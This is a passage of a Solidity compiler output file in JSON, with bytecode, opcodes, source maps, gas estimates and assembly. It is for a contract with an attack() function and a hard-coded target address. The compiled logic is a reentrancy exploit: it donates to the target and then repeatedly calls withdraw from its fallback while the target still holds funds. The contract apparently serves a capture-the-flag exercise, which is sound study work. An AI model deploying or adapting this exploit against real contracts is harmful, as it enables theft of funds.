							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x25C951BAC0B1418718822DBED066D7FE230EB0C0 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH8 0xDE0B6B3A7640000 PUSH1 0x1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x70 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x455 DUP1 PUSH2 0x80 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C8AE38C EQ PUSH2 0x11E JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x175 JUMPI DUP1 PUSH4 0xAA8C217C EQ PUSH2 0x18C JUMPI DUP1 PUSH4 0xD7BB99BA EQ PUSH2 0x1B7 JUMPI PUSH2 0x119 JUMP JUMPDEST CALLDATASIZE PUSH2 0x119 JUMPI PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE EQ PUSH2 0x117 JUMPI PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x112 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x12A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x133 PUSH2 0x1C1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x181 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x18A PUSH2 0x1E6 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x198 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1A1 PUSH2 0x357 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1BF PUSH2 0x35D JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x64 PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x8BA1456200000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x2E7 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x2C4 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x349 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x34E JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP POP POP JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH3 0x362A95 PUSH1 0x1 SLOAD PUSH3 0x3D0900 SWAP1 ADDRESS PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP10 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x403 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP DUP9 CALL ISZERO DUP1 ISZERO PUSH2 0x417 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH32 0x89780F5212765AAFA96928E2508BBBE614CD41D3395D2A73A49E7C781BAC6364 PUSH20 0x6F6C634300060000330000000000000000000000 ",
							"sourceMap": "85:519:0:-:0;;;144:42;111:76;;;;;;;;;;;;;;;;;;;;214:7;193:28;;85:519;8:9:-1;5:2;;;30:1;27;20:12;5:2;85:519:0;;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "6080604052600436106100435760003560e01c80636c8ae38c1461011e5780639e5faafc14610175578063aa8c217c1461018c578063d7bb99ba146101b757610119565b366101195760008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163114610117576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6001546040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156100fe57600080fd5b505af1158015610112573d6000803e3d6000fd5b505050505b005b600080fd5b34801561012a57600080fd5b506101336101c1565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561018157600080fd5b5061018a6101e6565b005b34801561019857600080fd5b506101a1610357565b6040518082815260200191505060405180910390f35b6101bf61035d565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600060606000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166064604051602401808260ff1681526020019150506040516020818303038152906040527f8ba14562000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106102e757805182526020820191506020810190506020830392506102c4565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610349576040519150601f19603f3d011682016040523d82523d6000602084013e61034e565b606091505b50915091505050565b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662362a95600154623d090090306040518463ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019150506000604051808303818589803b15801561040357600080fd5b5088f1158015610417573d6000803e3d6000fd5b50505050505056fea26469706673582212207f89780f5212765aafa96928e2508bbbe614cd41d3395d2a73a49e7c781bac6364736f6c63430006000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C8AE38C EQ PUSH2 0x11E JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x175 JUMPI DUP1 PUSH4 0xAA8C217C EQ PUSH2 0x18C JUMPI DUP1 PUSH4 0xD7BB99BA EQ PUSH2 0x1B7 JUMPI PUSH2 0x119 JUMP JUMPDEST CALLDATASIZE PUSH2 0x119 JUMPI PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE EQ PUSH2 0x117 JUMPI PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x112 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x12A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x133 PUSH2 0x1C1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x181 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x18A PUSH2 0x1E6 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x198 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1A1 PUSH2 0x357 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1BF PUSH2 0x35D JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x64 PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x8BA1456200000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x2E7 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x2C4 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x349 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x34E JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP POP POP JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH3 0x362A95 PUSH1 0x1 SLOAD PUSH3 0x3D0900 SWAP1 ADDRESS PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP10 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x403 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP DUP9 CALL ISZERO DUP1 ISZERO PUSH2 0x417 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH32 0x89780F5212765AAFA96928E2508BBBE614CD41D3395D2A73A49E7C781BAC6364 PUSH20 0x6F6C634300060000330000000000000000000000 ",
							"sourceMap": "85:519:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;548:1;534;;;;;;;;;;;526:18;;;:23;522:74;;566:1;;;;;;;;;;;:10;;;577:6;;566:18;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;566:18:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;566:18:0;;;;522:74;85:519;;;;;111:76;;8:9:-1;5:2;;;30:1;27;20:12;5:2;111:76:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;337:143;;8:9:-1;5:2;;;30:1;27;20:12;5:2;337:143:0;;;:::i;:::-;;193:28;;8:9:-1;5:2;;;30:1;27;20:12;5:2;193:28:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;228:104;;;:::i;:::-;;111:76;;;;;;;;;;;;;:::o;337:143::-;373:12;387:19;418:1;;;;;;;;;;;410:15;;468:3;426:46;;;;;;;;;;;;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;426:46:0;;;;;;;38:4:-1;29:7;25:18;67:10;61:17;96:58;199:8;192:4;186;182:15;179:29;167:10;160:49;0:215;;;426:46:0;410:63;;;;;;;;;;;;;36:153:-1;66:2;61:3;58:11;36:153;;182:3;176:10;171:3;164:23;98:2;93:3;89:12;82:19;;123:2;118:3;114:12;107:19;;148:2;143:3;139:12;132:19;;36:153;;;274:1;267:3;263:2;259:12;254:3;250:22;246:30;315:4;311:9;305:3;299:10;295:26;356:4;350:3;344:10;340:21;389:7;380;377:20;372:3;365:33;3:399;;;410:63:0;;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;19;14:27;;;;67:4;61:11;56:16;;134:4;130:9;123:4;105:16;101:27;97:43;94:1;90:51;84:4;77:65;157:16;154:1;147:27;211:16;208:1;201:4;198:1;194:12;179:49;5:228;;14:27;32:4;27:9;;5:228;;372:101:0;;;;337:143;;:::o;193:28::-;;;;:::o;228:104::-;275:1;;;;;;;;;;;:8;;;290:6;;302:7;275:35;319:4;275:50;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;275:50:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;275:50:0;;;;;;228:104::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "221800",
								"executionCost": "41136",
								"totalCost": "262936"
							},
							"external": {
								"amount()": "1027",
								"attack()": "infinite",
								"contribute()": "infinite",
								"r()": "1031"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 85,
									"end": 604,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 85,
									"end": 604,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 85,
									"end": 604,
									"name": "MSTORE"
								},
								{
									"begin": 144,
									"end": 186,
									"name": "PUSH",
									"value": "25C951BAC0B1418718822DBED066D7FE230EB0C0"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "DUP1"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "EXP"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "DUP2"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "SLOAD"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "DUP2"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "MUL"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "NOT"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "AND"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "SWAP1"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "DUP4"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "AND"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "MUL"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "OR"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "SWAP1"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "SSTORE"
								},
								{
									"begin": 111,
									"end": 187,
									"name": "POP"
								},
								{
									"begin": 214,
									"end": 221,
									"name": "PUSH",
									"value": "DE0B6B3A7640000"
								},
								{
									"begin": 193,
									"end": 221,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 193,
									"end": 221,
									"name": "SSTORE"
								},
								{
									"begin": 85,
									"end": 604,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 85,
									"end": 604,
									"name": "POP"
								},
								{
									"begin": 85,
									"end": 604,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 85,
									"end": 604,
									"name": "DUP1"
								},
								{
									"begin": 85,
									"end": 604,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 85,
									"end": 604,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 85,
									"end": 604,
									"name": "CODECOPY"
								},
								{
									"begin": 85,
									"end": 604,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 85,
									"end": 604,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212207f89780f5212765aafa96928e2508bbbe614cd41d3395d2a73a49e7c781bac6364736f6c63430006000033",
									".code": [
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "MSTORE"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "LT"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "JUMPI"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "SHR"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "DUP1"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH",
											"value": "6C8AE38C"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "EQ"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "JUMPI"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "DUP1"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH",
											"value": "9E5FAAFC"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "EQ"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "JUMPI"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "DUP1"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH",
											"value": "AA8C217C"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "EQ"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "JUMPI"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "DUP1"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH",
											"value": "D7BB99BA"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "EQ"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "JUMPI"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "JUMP"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "JUMPDEST"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 85,
											"end": 604,
											"name": "JUMPI"
										},
										{
											"begin": 548,
											"end": 549,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 534,
											"end": 535,
											"name": "DUP1"
										},
										{
											"begin": 534,
											"end": 535,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 534,
											"end": 535,
											"name": "SWAP1"
										},
										{
											"begin": 534,
											"end": 535,
											"name": "SLOAD"
										},
										{
											"begin": 534,
											"end": 535,
											"name": "SWAP1"
										},
										{
											"begin": 534,
											"end": 535,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 534,
											"end": 535,
											"name": "EXP"
										},
										{
											"begin": 534,
											"end": 535,
											"name": "SWAP1"
										},
										{
											"begin": 534,
											"end": 535,
											"name": "DIV"
										},
										{
											"begin": 534,
											"end": 535,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 534,
											"end": 535,
											"name": "AND"
										},
										{
											"begin": 526,
											"end": 544,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 526,
											"end": 544,
											"name": "AND"
										},
										{
											"begin": 526,
											"end": 544,
											"name": "BALANCE"
										},
										{
											"begin": 526,
											"end": 549,
											"name": "EQ"
										},
										{
											"begin": 522,
											"end": 596,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 522,
											"end": 596,
											"name": "JUMPI"
										},
										{
											"begin": 566,
											"end": 567,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 566,
